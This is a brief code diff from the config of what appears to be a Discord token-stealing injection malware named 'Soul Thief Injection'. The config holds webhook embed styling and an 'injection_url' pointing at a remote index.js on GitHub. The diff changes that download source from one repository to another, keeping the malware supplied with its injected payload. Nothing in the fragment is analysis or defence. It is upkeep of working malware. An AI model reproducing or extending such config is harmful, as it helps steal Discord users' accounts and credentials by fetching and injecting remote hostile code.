@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Soul Thief Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/IronShoka/injection/main/index.js', 
   /**
    
    **/
